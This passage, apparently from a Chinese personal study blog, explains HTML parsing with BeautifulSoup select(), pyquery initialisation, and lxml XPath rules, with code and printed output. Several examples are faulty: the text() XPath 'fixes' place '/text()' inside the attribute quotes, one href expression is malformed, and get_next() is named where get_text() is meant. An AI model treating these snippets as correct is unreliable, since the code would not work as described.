<p>除了find()方法，还有：<br>find_parents()和find_parent()，前者返回所有祖先节点，后面返回直接父节点<br>find_next_siblings()和find_next_sibling()与查询祖先的方法类似<br>find_previous_siblings()和find_previous_sibling()与查询祖先的方法类似<br>find_all_next()和find_next()前者返回节点后所有符合条件的节点，后者返回第一个符合条件的节点<br>find_all_previous()和find_previous()前者返回节点前所有符合条件的节点，后者返回第一个符合条件的节点</p>
<h3 id="CSS查询器"><a href="#CSS查询器" class="headerlink" title="CSS查询器"></a>CSS查询器</h3><p>使用CSS选择器，只需要调用select()方法，传入相应的CSS选择器即可<br><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">html='''</span><br><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">"panel"</span>&gt;</span><br><span class="line">    &lt;div <span class="keyword">class</span>=<span class="string">"panel-heading"</span>&gt;</span><br><span class="line">        &lt;h4&gt;Hello&lt;/h4&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div <span class="keyword">class</span>=<span class="string">"panel-body"</span>&gt;</span><br><span class="line">        &lt;ul <span class="keyword">class</span>=<span class="string">"list"</span> id=<span class="string">"list-1"</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Foo&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Bar&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Jay&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">        &lt;ul <span class="keyword">class</span>=<span class="string">"list list-small"</span> id=<span class="string">"list-2"</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Foo&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Bar&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">'''</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, 'lxml')</span><br><span class="line"><span class="keyword">print</span>(soup.select('.panel .panel-heading'))</span><br><span class="line"><span class="keyword">print</span>(soup.select('ul <span class="keyword">li</span>'))</span><br><span class="line"><span class="keyword">print</span>(soup.select('#<span class="keyword">list</span>-2 .element'))</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">type</span>(soup.select('ul')[0]))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">[&lt;div <span class="keyword">class</span>=<span class="string">"panel-heading"</span>&gt;</span><br><span class="line">&lt;h4&gt;Hello&lt;/h4&gt;</span><br><span class="line">&lt;/div&gt;]</span><br><span class="line">[&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Foo&lt;/<span class="keyword">li</span>&gt;, &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Bar&lt;/<span class="keyword">li</span>&gt;, &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Jay&lt;/<span class="keyword">li</span>&gt;, &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Foo&lt;/<span class="keyword">li</span>&gt;, &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Bar&lt;/<span class="keyword">li</span>&gt;]</span><br><span class="line">[&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Foo&lt;/<span class="keyword">li</span>&gt;, &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"element"</span>&gt;Bar&lt;/<span class="keyword">li</span>&gt;]</span><br><span class="line">&lt;<span class="keyword">class</span> 'bs4.element.Tag'&gt;</span><br></pre></td></tr></table></figure><br>可以看到类似于CSS中选择器的方式<br>ul li就是查询ul节点下的所有li节点，结果就是li节点组成的列表</p>
<h4 id="嵌套查询"><a href="#嵌套查询" class="headerlink" title="嵌套查询"></a>嵌套查询</h4><p>select()同样支持嵌套查询<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line"><span class="keyword">for</span> ul <span class="keyword">in</span> soup.select(<span class="string">'ul'</span>):</span><br><span class="line">    print(ul.select(<span class="string">'li'</span>))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">[&lt;li <span class="keyword">class</span>="<span class="symbol">element</span>"&gt;<span class="symbol">Foo</span>&lt;/<span class="symbol">li</span>&gt;, &lt;<span class="symbol">li</span> <span class="symbol">class</span>="<span class="symbol">element</span>"&gt;<span class="symbol">Bar</span>&lt;/<span class="symbol">li</span>&gt;, &lt;<span class="symbol">li</span> <span class="symbol">class</span>="<span class="symbol">element</span>"&gt;<span class="symbol">Jay</span>&lt;/<span class="symbol">li</span>&gt;]</span><br><span class="line">[&lt;<span class="symbol">li</span> <span class="symbol">class</span>="<span class="symbol">element</span>"&gt;<span class="symbol">Foo</span>&lt;/<span class="symbol">li</span>&gt;, &lt;<span class="symbol">li</span> <span class="symbol">class</span>="<span class="symbol">element</span>"&gt;<span class="symbol">Bar</span>&lt;/<span class="symbol">li</span>&gt;]</span><br></pre></td></tr></table></figure><br>可以看到这里先是选择了ul节点，再遍历每个ul节点，选择其li节点<br>输出了所有ul节点下的所有li节点</p>
<h4 id="获取属性"><a href="#获取属性" class="headerlink" title="获取属性"></a>获取属性</h4><figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">from </span><span class="string">bs4 </span><span class="string">import </span><span class="string">BeautifulSoup</span></span><br><span class="line"><span class="string">soup </span>= <span class="string">BeautifulSoup(</span><span class="string">html,</span> <span class="string">'lxml'</span>)</span><br><span class="line"><span class="string">for </span><span class="string">ul </span><span class="string">in </span><span class="string">soup.</span><span class="string">select(</span><span class="string">'ul'</span>):</span><br><span class="line">    <span class="string">print(</span><span class="string">ul[</span><span class="string">'id'</span>])</span><br><span class="line">    <span class="string">print(</span><span class="string">ul.</span><span class="string">attrs[</span><span class="string">'id'</span>])</span><br><span class="line">    </span><br><span class="line">输出结果：</span><br><span class="line"><span class="built_in">list-1</span></span><br><span class="line"><span class="built_in">list-1</span></span><br><span class="line"><span class="built_in">list-2</span></span><br><span class="line"><span class="built_in">list-2</span></span><br></pre></td></tr></table></figure>
<p>可以看到，直接传入中括号和属性名，以及通过attrs属性获取属性值，都可以成功</p>
<h4 id="获取文本"><a href="#获取文本" class="headerlink" title="获取文本"></a>获取文本</h4><figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 import BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, <span class="comment">'lxml')</span></span><br><span class="line"><span class="keyword">for</span> li <span class="keyword">in</span> soup.<span class="keyword">select</span>(<span class="comment">'li'):</span></span><br><span class="line">    print(<span class="comment">'Get Text:', li.get_text())</span></span><br><span class="line">    print(<span class="comment">'String:', li.string)</span></span><br><span class="line">    </span><br><span class="line">输出结果：</span><br><span class="line"><span class="keyword">Get</span> <span class="keyword">Text</span>: Foo</span><br><span class="line"><span class="built_in">String</span>: Foo</span><br><span class="line"><span class="keyword">Get</span> <span class="keyword">Text</span>: Bar</span><br><span class="line"><span class="built_in">String</span>: Bar</span><br><span class="line"><span class="keyword">Get</span> <span class="keyword">Text</span>: Jay</span><br><span class="line"><span class="built_in">String</span>: Jay</span><br><span class="line"><span class="keyword">Get</span> <span class="keyword">Text</span>: Foo</span><br><span class="line"><span class="built_in">String</span>: Foo</span><br><span class="line"><span class="keyword">Get</span> <span class="keyword">Text</span>: Bar</span><br><span class="line"><span class="built_in">String</span>: Bar</span><br></pre></td></tr></table></figure>
<p>string和get_next()两者效果完全一致</p>
<h1 id="pyquery"><a href="#pyquery" class="headerlink" title="pyquery"></a>pyquery</h1><p>这个库主要是以CSS选择器为主，如果对jQuery有所了解，那么这个解析库更加方便</p>
<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><h3 id="字符串初始化"><a href="#字符串初始化" class="headerlink" title="字符串初始化"></a>字符串初始化</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">html = '''</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">'''</span><br><span class="line">from pyquery import PyQuery as pq</span><br><span class="line">doc = pq(html)</span><br><span class="line">print(doc('li'))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>首先引入pyquery这个对象，取别名为pq，后面将HTML字符串传递给pyquery类，就完成了初始化，接下来将其传入CSS选择器，我们传入li节点，就可以选择所有的li节点</p>
<h3 id="URL初始化"><a href="#URL初始化" class="headerlink" title="URL初始化"></a>URL初始化</h3><p>初始化的参数不仅可以是字符串，还可以传入网页的URL<br><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">from pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line">doc = pq(url=<span class="string">'https://diao-diaoupup.cn/'</span>)</span><br><span class="line">print<span class="built_in">(doc</span>(<span class="string">'title'</span>))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>diao-diao-UPUP<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>这样的话，pyquery对象会先请求这个URL，然后用得到的HTML内容完成初始化,与下面方法功能相同<br><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">from pyquery import PyQuery as pq</span><br><span class="line">import requests</span><br><span class="line">doc=pq(<span class="name">requests</span>.get('https<span class="symbol">://diao-diaoupup</span>.cn/').text)</span><br><span class="line">print(<span class="name">doc</span>('title'))</span><br></pre></td></tr></table></figure></p>
<h3 id="文件初始化"><a href="#文件初始化" class="headerlink" title="文件初始化"></a>文件初始化</h3><p>除了传递URL，还可以传递本地的文件名，指定参数为filename即可<br><figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">from</span> <span class="variable">pyquery</span> <span class="variable">import</span> <span class="variable">PyQuery</span> <span class="variable">as</span> <span class="variable">pq</span></span><br><span class="line"><span class="variable">doc</span> = <span class="function"><span class="title">pq</span>(<span class="variable">filename</span>=<span class="string">'demo.html'</span>)</span></span><br><span class="line"><span class="function"><span class="title">print</span>(<span class="title">doc</span>(<span class="string">'li'</span>))</span></span><br></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.beautiful soup推荐使用lxml解析库，必要时使用html.parser</p>
<p>2.节点选择筛选功能弱但是速度很快</p>
<p>3.建议使用find()和find_all()方法匹配单个结果或者多个结果</p>
<p>4.如果对CSS选择器熟悉的话，可以使用select()方法选择</p>
<p>5.pyquery库的使用方法类似于CSS中的选择器，相比beautiful soup中的CSS选择器更加强大，而且更加方便，URL初始化时会自动请求该网页而不需要引入requests库</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Python3开发</category>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-2020/3/27-XPath</title>
    <url>/2020/03/27/Python3-2020-3-27-%E5%91%A8%E6%8A%A55/</url>
    <content><![CDATA[<h1 id="XPath"><a href="#XPath" class="headerlink" title="XPath"></a>XPath</h1><p>之前实现了最基本的爬虫，使用正则表达式来获取页面，但是正则表达式在遇到一些复杂问题的时候就会变得繁琐，有一个地方写错了就有可能导致匹配失败，所以引入解析库来帮助获取</p>
<p>XPath是XML路径语言，但是同时也适用于HTML文档的搜索</p>
<h2 id="常用规则"><a href="#常用规则" class="headerlink" title="常用规则"></a>常用规则</h2><div class="table-container">
<table>
<thead>
<tr>
<th>表达式</th>
<th>描述 </th>
</tr>
</thead>
<tbody>
<tr>
<td>nodename</td>
<td>选取此节点的所有子节点 </td>
</tr>
<tr>
<td>/</td>
<td>从当前节点选取直接子节点</td>
</tr>
<tr>
<td>//</td>
<td>从当前节点选取子孙节点</td>
</tr>
<tr>
<td>.</td>
<td>选取当前节点</td>
</tr>
<tr>
<td>..</td>
<td>选取当前节点的父节点</td>
</tr>
<tr>
<td>@</td>
<td>选取属性</td>
</tr>
</tbody>
</table>
</div>
<p>常用匹配规则：<br><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">//title[<span class="symbol">@lang</span>=<span class="string">'eng'</span>]</span><br></pre></td></tr></table></figure><br>它代表选择所有名称为title,同时属性lang的值为eng的节点</p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line"></span><br><span class="line">text='''</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">""</span><span class="attr">item-0</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link1.html"</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">""</span><span class="attr">item-1</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">""</span><span class="attr">item-2</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">""</span><span class="attr">item-3</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">'''</span><br><span class="line"></span><br><span class="line">html=etree.HTML(text)</span><br><span class="line">result=etree.tostring(html)</span><br><span class="line">print(result.decode('utf-8'))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">""</span> <span class="attr">item-0</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link1.html"</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">""</span> <span class="attr">item-1</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">""</span> <span class="attr">item-2</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">""</span> <span class="attr">item-3</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>首先声明了一段HTML文本，调用HTML类进行初始化，这里就成功构造了一个XPath解析对象</p>
<p>可以看到缺一个li标签的结尾，但是etree模块可以自动修正HTML文本</p>
<p>再调用tostring()方法即可输出修正后的结果，但是结果是bytes类型，使用decode(）方法转成str类型</p>
<p>li标签补全了，还自动添加了body html节点</p>
<h2 id="所有节点"><a href="#所有节点" class="headerlink" title="所有节点"></a>所有节点</h2><p>我们一般会用//开头的XPath规则来选取所有符合要求的节点<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml import etree</span><br><span class="line"></span><br><span class="line"><span class="attribute">html</span>=etree.parse('./test.html',etree.HTMLParser())</span><br><span class="line"><span class="attribute">result</span>=html.xpath('//*')</span><br><span class="line"><span class="builtin-name">print</span>(result)</span><br></pre></td></tr></table></figure><br>这里使用*代表匹配所有节点，也就是HTML文本中的所有节点都会被获取，返回结果是一个列表，每个元素是Element类型，其后跟着节点名称，如html,body,div,ul,li,a等</p>
<p>如果只想获取li标签<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml import etree</span><br><span class="line"></span><br><span class="line"><span class="attribute">html</span>=etree.parse('./test.html',etree.HTMLParser())</span><br><span class="line"><span class="attribute">result</span>=html.xpath('//li')</span><br><span class="line"><span class="builtin-name">print</span>(result)</span><br><span class="line"><span class="builtin-name">print</span>(result[0])</span><br></pre></td></tr></table></figure></p>
<p>想取出某个元素，使用[number]就行</p>
<h2 id="子节点"><a href="#子节点" class="headerlink" title="子节点"></a>子节点</h2><p>我们可以通过/或//查找元素的子节点或子孙节点<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml import etree</span><br><span class="line"></span><br><span class="line"><span class="attribute">html</span>=etree.parse('./test.html',etree.HTMLParser())</span><br><span class="line"><span class="attribute">result</span>=html.xpath('//li/a')</span><br><span class="line"><span class="builtin-name">print</span>(result)</span><br></pre></td></tr></table></figure><br>这样就获取了li节点下的所有a子节点</p>
<p>此处的/用于选取直接子节点，如果想要获取所有子孙节点，就可以使用//<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml import etree</span><br><span class="line"></span><br><span class="line"><span class="attribute">html</span>=etree.parse('./test.html',etree.HTMLParser())</span><br><span class="line"><span class="attribute">result</span>=html.xpath('//li//a')</span><br><span class="line"><span class="builtin-name">print</span>(result)</span><br></pre></td></tr></table></figure><br>这样就获取了li节点下的所有a节点，输出结果一样</p>
<p>但是如果使用<code>//li/a</code>这样的情况，如果li下没有直接的a子节点，那么救无法获取任何匹配结果</p>
<h2 id="父节点"><a href="#父节点" class="headerlink" title="父节点"></a>父节点</h2><p>寻找父节点的方式与返回根目录的方式基本一样，使用..来返回</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml import etree</span><br><span class="line"></span><br><span class="line"><span class="attribute">html</span>=etree.parse('./test.html',etree.HTMLParser())</span><br><span class="line"><span class="attribute">result</span>=html.xpath('//a[@<span class="attribute">href</span>=<span class="string">"link4.html"</span>]/<span class="built_in">..</span>/@class<span class="string">')</span></span><br><span class="line"><span class="string">print(result)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">输出结果：</span></span><br><span class="line"><span class="string">['</span>item-1<span class="string">']</span></span><br></pre></td></tr></table></figure>
<p>这里可以看到基本和目录方式一致，想要查找的a子节点的属性，之后跟上想要获取的父节点</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml import etree</span><br><span class="line"></span><br><span class="line"><span class="attribute">html</span>=etree.parse('./test.html',etree.HTMLParser())</span><br><span class="line"><span class="attribute">result</span>=html.xpath('//a[@<span class="attribute">href</span>=<span class="string">"link4.html"</span>]/parent::*/@class<span class="string">')</span></span><br><span class="line"><span class="string">print(result)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">输出结果：</span></span><br><span class="line"><span class="string">['</span>item-1<span class="string">']</span></span><br></pre></td></tr></table></figure>
<p>也可以使用parent::来获取父节点</p>
<h2 id="属性匹配"><a href="#属性匹配" class="headerlink" title="属性匹配"></a>属性匹配</h2><p>我们可以使用@符号来进行属性过滤<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml import etree</span><br><span class="line"></span><br><span class="line"><span class="attribute">html</span>=etree.parse('./test.html',etree.HTMLParser())</span><br><span class="line"><span class="attribute">result</span>=html.xpath('//li[@<span class="attribute">class</span>=<span class="string">"item-0"</span>]<span class="string">')</span></span><br><span class="line"><span class="string">print(result)</span></span><br></pre></td></tr></table></figure></p>
<p>这里使用了@符号限定了class的值为item-0，所以会返回class属性为item-0的所有li节点</p>
<h2 id="文本获取"><a href="#文本获取" class="headerlink" title="文本获取"></a>文本获取</h2><p>我们可以使用text()方法来获取节点中的文本<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml import etree</span><br><span class="line"></span><br><span class="line"><span class="attribute">html</span>=etree.parse('./test.html',etree.HTMLParser())</span><br><span class="line"><span class="attribute">result</span>=html.xpath('//li[@<span class="attribute">class</span>=<span class="string">"item-0/text()"</span>]<span class="string">')</span></span><br><span class="line"><span class="string">print(result)</span></span><br></pre></td></tr></table></figure></p>
<p>这种方法不太推荐，是个错误示范，返回结果可以不会有，因为/在XPath中的意思是匹配直接子节点，如果没有直接子节点，就不会返回</p>
<p>所以可以使用//或者先访问直接子节点a再text()</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml import etree</span><br><span class="line"></span><br><span class="line"><span class="attribute">html</span>=etree.parse('./test.html',etree.HTMLParser())</span><br><span class="line"><span class="attribute">result</span>=html.xpath('//li[@<span class="attribute">class</span>=<span class="string">"item-0//text()"</span>]<span class="string">')</span></span><br><span class="line"><span class="string">print(result)</span></span><br></pre></td></tr></table></figure>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml import etree</span><br><span class="line"></span><br><span class="line"><span class="attribute">html</span>=etree.parse('./test.html',etree.HTMLParser())</span><br><span class="line"><span class="attribute">result</span>=html.xpath('//li[@<span class="attribute">class</span>=<span class="string">"item-0/a/text()"</span>]<span class="string">')</span></span><br><span class="line"><span class="string">print(result)</span></span><br></pre></td></tr></table></figure>
<h2 id="属性获取"><a href="#属性获取" class="headerlink" title="属性获取"></a>属性获取</h2><p>我们知道使用text()可以获取节点内所有文本，节点属性我们可以使用@符号</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line"></span><br><span class="line">html=etree.parse(<span class="string">'./test.html'</span>,etree.HTMLParser())</span><br><span class="line">result=<span class="selector-tag">html</span>.xpath(<span class="string">'//li/a/@href"]'</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(result)</span></span></span><br></pre></td></tr></table></figure>
<p>获取所有li节点下所有a节点的href属性</p>
<h2 id="属性多值匹配"><a href="#属性多值匹配" class="headerlink" title="属性多值匹配"></a>属性多值匹配</h2><p>有时候一个属性可能有多个值<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">text=<span class="string">'''</span></span><br><span class="line"><span class="string">&lt;li class="li li-first"&gt;&lt;a href="link.html"&gt;first item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">html=etree.HTML(text)</span><br><span class="line">result=html.xpath(<span class="string">'//li[@class="li"]/a/text()'</span>)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><br>这个例子中li有两个属性li和li-first，使用之前的方法就无法匹配了，这样就引入我们的contains()方法，第一个参数传入属性名称，第二个参数传入属性值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">text=<span class="string">'''</span></span><br><span class="line"><span class="string">&lt;li class="li li-first"&gt;&lt;a href="link.html"&gt;first item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">html=etree.HTML(text)</span><br><span class="line">result=html.xpath(<span class="string">'//li[contains(@class,"li")]/a/text()'</span>)</span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">first item</span><br></pre></td></tr></table></figure>
<p>这样就能取出文本内容了</p>
